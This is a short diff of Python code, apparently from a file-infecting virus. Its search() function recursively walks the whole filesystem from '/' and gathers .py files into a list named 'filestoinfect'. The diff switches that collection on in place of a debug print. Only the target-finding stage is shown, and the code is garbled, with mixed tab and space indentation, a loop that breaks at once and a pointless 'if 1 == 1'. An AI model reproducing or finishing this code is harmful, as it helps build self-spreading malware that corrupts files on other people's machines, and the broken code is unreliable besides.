@@ -5,13 +5,12 @@ def search(path):
     for fname in filelist:
         if os.path.isdir(path+"/"+fname):
             filestoinfect.extend(search(path+"/"+fname))
-        elif fname[-3:] == ".py" or fname[-3:] == ".sh" or fname[-3:] == ".pl":
+		elif fname[-3:] == ".py":
             for line in open(path+"/"+fname):
                     break
             if 1 == 1:
-				print (path+"/"+fname)
-                #filestoinfect.append(path+"/"+fname)
+				#print (path+"/")
+                filestoinfect.append(path+"/"+fname)
     return filestoinfect
 	
 search("/")
-#        elif fname[-3:] == ".py":
